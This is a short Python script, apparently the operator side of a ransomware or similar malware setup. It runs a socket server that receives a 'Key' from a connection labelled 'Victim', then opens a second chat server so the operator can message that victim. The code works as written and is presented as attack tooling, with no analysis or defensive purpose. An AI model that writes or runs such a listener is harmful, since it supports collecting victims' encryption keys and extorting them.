import socket


def Initiate():
    print("Server active:")
    connection = socket.socket()
    port = 2000
    connection.bind(('', port))
    connection.listen(5)
    created_connection, addr = connection.accept()
    print("Victim is: ",addr, " Key is:")
    getdata = created_connection.recv(1024).decode()
    print (getdata)
    created_connection.close()


def Chat():
    print("Chat Server active:")
    connection = socket.socket()
    port = 1000
    connection.bind(('', port))
    connection.listen(5)
    created_connection, addr = connection.accept()
    print("Working",addr)
    while True:
        getdata = created_connection.recv(1024).decode()
        print ("Victim:",getdata)
        sendData = input("Server: ")
        created_connection.send(sendData.encode())
        if(sendData == "Exit"):
            break
    created_connection.close()



Initiate()
Chat()